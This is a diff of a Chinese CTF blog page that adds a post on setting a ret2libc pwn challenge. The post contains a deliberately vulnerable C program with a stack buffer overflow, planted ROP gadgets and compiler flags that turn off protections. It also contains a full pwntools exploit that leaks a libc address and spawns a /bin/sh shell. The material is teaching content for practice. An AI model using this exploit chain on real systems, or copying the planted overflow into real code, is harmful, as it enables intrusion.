@@ -69,6 +69,49 @@
       <div class="outer">
         <section id="main">
   
+    <article id="post-pwn-user/pwn-出题-ret2libc" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2024/10/16/pwn-user/pwn-%E5%87%BA%E9%A2%98-ret2libc/" class="article-date">
+  <time class="dt-published" datetime="2024-10-16T13:37:50.000Z" itemprop="datePublished">2024-10-16</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="p-name article-title" href="/2024/10/16/pwn-user/pwn-%E5%87%BA%E9%A2%98-ret2libc/">pwn-出题-ret2libc</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <h2 id="关闭pie"><a href="#关闭pie" class="headerlink" title="关闭pie"></a>关闭pie</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="type">void</span> <span class="title function_">before_start</span><span class="params">()</span>&#123;</span><br><span class="line">    setvbuf(<span class="built_in">stdin</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">    setvbuf(<span class="built_in">stdout</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">    setvbuf(<span class="built_in">stderr</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">    <span class="type">char</span> *help=<span class="string">&quot;do you know ret2libc&quot;</span>;</span><br><span class="line">    write(<span class="number">0</span>,help,<span class="number">20</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">for_rop</span><span class="params">()</span>&#123;</span><br><span class="line">    __asm__(</span><br><span class="line">        <span class="string">&quot;pop %rdi\n&quot;</span></span><br><span class="line">        <span class="string">&quot;ret;\n&quot;</span></span><br><span class="line">        <span class="string">&quot;pop %rax\n&quot;</span></span><br><span class="line">        <span class="string">&quot;ret;\n&quot;</span></span><br><span class="line">        <span class="string">&quot;pop %rsi\n&quot;</span></span><br><span class="line">        <span class="string">&quot;ret;\n&quot;</span></span><br><span class="line"></span><br><span class="line">    );</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">vul</span><span class="params">()</span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="type">char</span> buf[<span class="number">32</span>];</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;please input:&quot;</span>);</span><br><span class="line">    read(<span class="number">0</span>,buf,<span class="number">0x80</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;bye&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    before_start();</span><br><span class="line">    vul();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p><code>gcc ret2libc.c -o ret2libc -no-pie -fno-stack-protector</code></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)  <span class="comment"># 64</span></span><br><span class="line">p=process(<span class="string">&quot;./ret2libc&quot;</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./ret2libc&#x27;</span>)</span><br><span class="line">libc=ELF(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line">rdi_ret=elf.search(asm(<span class="string">&#x27;pop rdi;ret&#x27;</span>)).__next__()</span><br><span class="line">ret=elf.search(asm(<span class="string">&#x27;ret&#x27;</span>)).__next__()</span><br><span class="line"></span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x20</span>+<span class="number">8</span>)+ p64(rdi_ret)+ p64(elf.got[<span class="string">&#x27;puts&#x27;</span>]) + p64(elf.plt[<span class="string">&#x27;puts&#x27;</span>])+p64(elf.sym[<span class="string">&#x27;vul&#x27;</span>])</span><br><span class="line">p.sendlineafter(<span class="string">b&quot;:&quot;</span>,payload)</span><br><span class="line">puts_addr=u64(p.recvuntil(<span class="string">b&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;puts_addr:&quot;</span>,<span class="built_in">hex</span>(puts_addr))</span><br><span class="line">libc.address=puts_addr-libc.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;libc&quot;</span>,<span class="built_in">hex</span>(libc.address))</span><br><span class="line"></span><br><span class="line">bin_sh=libc.search(<span class="string">b&quot;/bin/sh&quot;</span>).__next__()</span><br><span class="line">payload2=<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x20</span>+<span class="number">8</span>)+p64(ret)+p64(rdi_ret)+p64(bin_sh)+p64(libc.sym[<span class="string">&#x27;system&#x27;</span>])</span><br><span class="line">p.sendlineafter(<span class="string">b&quot;:&quot;</span>,payload2)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="https://zt20xx.github.io/2024/10/16/pwn-user/pwn-%E5%87%BA%E9%A2%98-ret2libc/" data-id="cm49xop2o0008ou7og4624o5v" data-title="pwn-出题-ret2libc" class="article-share-link"><span class="fa fa-share">分享</span></a>
+      
+      
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/pwn/" rel="tag">pwn</a></li></ul>
+
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
     <article id="post-pwn-user/pwn-出题-ret2text" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
   <div class="article-meta">
     <a href="/2024/10/15/pwn-user/pwn-%E5%87%BA%E9%A2%98-ret2text/" class="article-date">
@@ -330,7 +373,7 @@
   <div class="widget-wrap">
     <h3 class="widget-title">标签</h3>
     <div class="widget">
-      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/bilibili/" rel="tag">bilibili</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/game/" rel="tag">game</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/kernel/" rel="tag">kernel</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/pwn/" rel="tag">pwn</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%90%81%E7%BD%AE/" rel="tag">搁置</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%9D%82%E9%A1%B9/" rel="tag">杂项</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E8%AE%B0%E5%BD%95%E4%B8%A2%E5%A4%B1/" rel="tag">记录丢失</a></li></ul>
+      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/bilibili/" rel="tag">bilibili</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/game/" rel="tag">game</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/kernel/" rel="tag">kernel</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/pax/" rel="tag">pax</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/pwn/" rel="tag">pwn</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%90%81%E7%BD%AE/" rel="tag">搁置</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%9D%82%E9%A1%B9/" rel="tag">杂项</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E8%AE%B0%E5%BD%95%E4%B8%A2%E5%A4%B1/" rel="tag">记录丢失</a></li></ul>
     </div>
   </div>
 
@@ -340,7 +383,7 @@
   <div class="widget-wrap">
     <h3 class="widget-title">标签云</h3>
     <div class="widget tagcloud">
-      <a href="/tags/bilibili/" style="font-size: 10px;">bilibili</a> <a href="/tags/game/" style="font-size: 10px;">game</a> <a href="/tags/kernel/" style="font-size: 20px;">kernel</a> <a href="/tags/pwn/" style="font-size: 20px;">pwn</a> <a href="/tags/%E6%90%81%E7%BD%AE/" style="font-size: 15px;">搁置</a> <a href="/tags/%E6%9D%82%E9%A1%B9/" style="font-size: 10px;">杂项</a> <a href="/tags/%E8%AE%B0%E5%BD%95%E4%B8%A2%E5%A4%B1/" style="font-size: 10px;">记录丢失</a>
+      <a href="/tags/bilibili/" style="font-size: 10px;">bilibili</a> <a href="/tags/game/" style="font-size: 10px;">game</a> <a href="/tags/kernel/" style="font-size: 20px;">kernel</a> <a href="/tags/pax/" style="font-size: 10px;">pax</a> <a href="/tags/pwn/" style="font-size: 20px;">pwn</a> <a href="/tags/%E6%90%81%E7%BD%AE/" style="font-size: 15px;">搁置</a> <a href="/tags/%E6%9D%82%E9%A1%B9/" style="font-size: 10px;">杂项</a> <a href="/tags/%E8%AE%B0%E5%BD%95%E4%B8%A2%E5%A4%B1/" style="font-size: 10px;">记录丢失</a>
     </div>
   </div>
 
@@ -366,6 +409,10 @@
           </li>
         
           <li>
+            <a href="/2024/12/05/pax-pageexec-old/">pax-pageexec.old</a>
+          </li>
+        
+          <li>
             <a href="/2024/12/04/bilibili-up/">bilibili-up</a>
           </li>
         
@@ -375,10 +422,6 @@
         
           <li>
             <a href="/2024/11/26/kernel/kernel-%E5%87%BA%E9%A2%98-check/">kernel-出题-check</a>
-          </li>
-        
-          <li>
-            <a href="/2024/11/26/kernel/kernel-%E5%87%BA%E9%A2%98-ret2user/">kernel-出题-ret2user</a>
           </li>
         
       </ul>
